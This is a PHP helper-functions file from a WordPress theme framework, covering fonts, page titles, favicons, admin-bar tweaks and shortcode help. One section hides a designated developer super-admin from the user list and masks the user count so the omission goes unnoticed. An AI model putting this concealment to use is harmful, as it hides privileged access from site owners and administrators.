<?php
/**
  * Helper Functions
  * 
  * Odds and ends Functions to help the Framework 
  * @since brnm 0.1
  * @lastmodified brnm 2.5.2
 **/


/* Add Google Fonts, as desired
 * @lastmodified brnm 2.5
-------------------------------------------------------- */
// fonts are added on the functions-custom.php page
function brnm_add_google_fonts($fonts, $location = 'wp') {
	if( $fonts ) {
		if(is_array($fonts)){
			$count = 0;
			foreach( $fonts as $url ) {
				$count++;
				wp_register_style( 'googlefont-'.$count, $url, array(), '', 'all');
				wp_enqueue_style( 'googlefont-'.$count );
			}
		} else {
			wp_register_style( 'googlefont', $fonts, array(), '', 'all');
			wp_enqueue_style( 'googlefont' );
		}
	}
}
add_action($location.'_enqueue_scripts', 'brnm_add_google_fonts');
	
	
/* Detect IE Version
-------------------------------------------------------- */
/* Checks to see if the browser is IE, and if so, can check for the version or against a specific version */
function brnm_is_IE( $chkver = null ) {
	global $is_IE;
	if ( ! $is_IE ) return false; // Not IE, so give a False
	
	if ( ! function_exists( 'wp_check_browser_version' ) ) include_once( ABSPATH . 'wp-admin/includes/dashboard.php' );
	$response = wp_check_browser_version();
	return number_format( $response['version'], 0, '', '' );
}


/* Enable titles on pages & posts
 * @lastmodified brnm 2.4
-------------------------------------------------------- */
function brnm_display_page_titles() {
	$brnm_display_pg_titles = false;
	if( function_exists('has_sub_field')) {
		$brnm_pg_titles = brnm_session('options_dev_page_titles');
		global $post;
		if( (is_page() && !is_singular()) && ( $brnm_pg_titles == 'enable_pages' || $brnm_pg_titles == 'enable_all' ) ) { $brnm_display_pg_titles = true; }
		elseif( (is_home() || is_singular()) && ( $brnm_pg_titles == 'enable_posts' || $brnm_pg_titles == 'enable_all' ) ) { $brnm_display_pg_titles = true; }
	}
	
	return $brnm_display_pg_titles;
}


/* Filter the Title on Home Page
 * @lastmodified brnm 2.5.2
 *
 * @param $description -- string - site description from
 	General Settings page.
-------------------------------------------------------- */
add_filter( 'wp_title', 'brnm_home_title' );
function brnm_home_title($title) {
	$description = get_bloginfo('description');
	
	if( is_front_page() ) {
		if( !empty( $description ) ) {
			return get_bloginfo('name') .' | '. $description;
		} else {
			return get_bloginfo('name');
		}
	}
	else {
		return $title;
	}
}


/* Favicon and Touch Icons
-------------------------------------------------------- */
/* 	Adds the favicon and touch icons to the header if the files are present 
 *	Place favicon.ico and apple-touch-icons in the images folder  
 *
 * 	Sizes:
 *	apple-touch-icon.png: 			60x60
 *	apple-touch-icon-ipad.png: 		72x72
 *	apple-touch-icon-iphone4.png: 	114x114
 *	apple-touch-icon-ipad3.png: 	144x144
 *	
 **/
function brnm_favicon_touch_icons() {
	$favicon_array = array();
	if( file_exists( get_template_directory() . '/images/favicon.ico' ) ) $favicon_array[] = '<link rel="shortcut icon" href="'. get_template_directory_uri() .'/images/favicon.ico">';
	if( file_exists( get_template_directory() . '/images/apple-touch-icon.png' ) ) $favicon_array[] = '<link rel="apple-touch-icon" href="'. get_template_directory_uri() .'/images/apple-touch-icon.png"><!--60X60-->';
	if( file_exists( get_template_directory() . '/images/apple-touch-icon-ipad.png' ) ) $favicon_array[] = '<link rel="apple-touch-icon" sizes="72x72" href="'. get_template_directory_uri() .'/images/apple-touch-icon-ipad.png"><!--72X72-->';
	if( file_exists( get_template_directory() . '/images/apple-touch-icon-iphone4.png' ) ) $favicon_array[] = '<link rel="apple-touch-icon" sizes="114x114" href="'. get_template_directory_uri() .'/images/apple-touch-icon-iphone4.png"><!--114X114-->';
	if( file_exists( get_template_directory() . '/images/apple-touch-icon-ipad3.png' ) ) $favicon_array[] = '<link rel="apple-touch-icon" sizes="144x144" href="'. get_template_directory_uri() .'/images/apple-touch-icon-ipad3.png">	<!--144X144-->';

	if( $favicon_array ) :
		foreach( $favicon_array as $favicon ) {
			echo $favicon;
		}	
	endif;
}


/* Remove the capital_P_danigit function
-------------------------------------------------------- */
if( !function_exists( 'brnm_remove_capital_P_dangit' ) ) {
	function brnm_remove_capital_P_dangit() { 
		remove_filter( 'the_content', 'capital_P_dangit' ); 
		remove_filter( 'the_title', 'capital_P_dangit' );
		remove_filter( 'comment_text', 'capital_P_dangit' );
	}
	add_action( 'init', 'brnm_remove_capital_P_dangit' );
}


/* Replace "Howdy" with time of day based greeting
 * @since brnm 2.2
 * @lastmodified brnm 2.5.2
-------------------------------------------------------- */
function brnm_admin_bar_replace_howdy($wp_admin_bar) {
	//$greeting = 'What\'s up, ';
	$account = $wp_admin_bar->get_node('my-account');

	$hour = date('H') + brnm_session('gmt_offset'); // set the $time to the current hour in the 24 hour clock format		
	$timezone = date('e'); // set the $timezone to the current timezone
	if ($hour >= '4' && $hour < '12') {
	    $greeting = 'Good morning,'; //before noon
	}
	elseif ($hour >= '12' && $hour < '17') {
	    $greeting = 'Good afternoon,'; //between noon and 5pm
	}
	elseif ($hour >= '17' && $hour < '21') {
	    $greeting = 'Good evening,'; //between 5pm and 9pm
	} 
	elseif ($hour >= '21' || ($hour >= '0' && $hour < '4')) {
	    $greeting = 'It\'s time for sleep,'; //after 9pm
	}

	$replace = str_replace('Howdy,', $greeting, $account->title);            
	$wp_admin_bar->add_node(array('id' => 'my-account', 'title' => $replace));
}
add_filter('admin_bar_menu', 'brnm_admin_bar_replace_howdy', 25);


/* Show HTML5 Base
-------------------------------------------------------- */
if( !function_exists( 'brnm_change_wp_generator' ) ) {
	function brnm_change_wp_generator() {
		$custom_generator = apply_filters( 'brnm_meta_generator', get_bloginfo('url') );
		return '<base href="'.$custom_generator.'" />';
		}
	add_filter('the_generator', 'brnm_change_wp_generator', 1 );
}


/* Removes the comment inline css
-------------------------------------------------------- */
if(!function_exists( 'brnm_remove_recent_comments_style' ) ) {
	function brnm_remove_recent_comments_style() {
		global $wp_widget_factory;
		remove_action( 'wp_head', array( $wp_widget_factory->widgets['WP_Widget_Recent_Comments'], 'recent_comments_style' ) );
	}
	add_action( 'widgets_init', 'brnm_remove_recent_comments_style' );
}


/* Remove superfluous elements from the admin bar (uncomment as necessary)
-------------------------------------------------------- */
if(!function_exists( 'brnm_remove_admin_bar_links' ) ) {
	function brnm_remove_admin_bar_links() {
		global $wp_admin_bar;
		$wp_admin_bar->remove_menu('new-link');
		$wp_admin_bar->remove_menu('wp-logo');
		/* Other Menu Items Include: updates, my-account, site-name, my-sites, get-shortlink, edit, new-content, comments, search */
	}
	add_action('wp_before_admin_bar_render', 'brnm_remove_admin_bar_links');
}


/* Hide Developer user from other users
 * @since brnm 2.4
-------------------------------------------------------- */
add_action('pre_user_query','brnm_pre_user_query');
function brnm_pre_user_query($user_search) {
	global $current_user;
	$username = $current_user->user_login; // get the current user
	
	// we'll cross the current user with the super admin / dev user, which is selected under Developer Options
	$superadminID = brnm_session('options_dev_super_admins');
	$superadmin = get_user_by('id', $superadminID);
	
	if ($username == $superadmin->user_login) {
		return;
	}
	else {
		global $wpdb;
		$user_search->query_where = str_replace('WHERE 1=1', "WHERE 1=1 AND {$wpdb->users}.user_login != '$superadmin->user_login'", $user_search->query_where);	
	}
}
// hide the number of users so nothing seems out of whack
function brnm_hide_user_count() {
	?>
	<style> .users-php span.count { display:none; } </style>
	<?php
}
add_action('admin_head','brnm_hide_user_count');


/* Search form HTML5 support
 * @since brnm 2.4
-------------------------------------------------------- */
add_theme_support( 'html5', array( 'search-form' ) );


/* Help Tabs
-------------------------------------------------------- */
add_action( 'load-post.php', 'brnm_shortcodes_help', 20 );
add_action( 'load-page.php', 'brnm_shortcodes_help', 20 );
function brnm_shortcodes_help() {
	
	$content = '<p>With the BRNM Framework, certain short codes come standard.</p><p>Display items under the <strong>Office</strong> tab of the General Options page:</p><ol><li>Copy this into the WYSIWYG below: <code>[office items=""]</code></li><li>Fill the "items" with these fields, comma separated: <code>main_phone, alternate_phone, fax_phone, email, address, office_hours</code></li><li>Example: <code>[office items="main_phone, alternate_phone, address"]</code></li></ol>';
	
	$screen = get_current_screen();
	//debug_print($screen);
	
	if($screen->id == 'post' || $screen->id == 'page') {
		$screen->add_help_tab( array(
			'id' => 'shortcodes-help',
			'title'    => 'Shortcodes',
			'content'  => $content
		) );
	}
}

/* Debug-enabled print function
 * @since brnm 2.4.4
 * @lastmodified brnm 2.4.5
-------------------------------------------------------- */
function debug_print( $item ) {
	if(debug_mode()) {
		echo '<pre>';
		print_r($item);
		echo '</pre>';
	}
	elseif(dev_mode()) {
		echo show_error('Error: Debug mode is disabled. REMOVE this line.');
	}
}
?>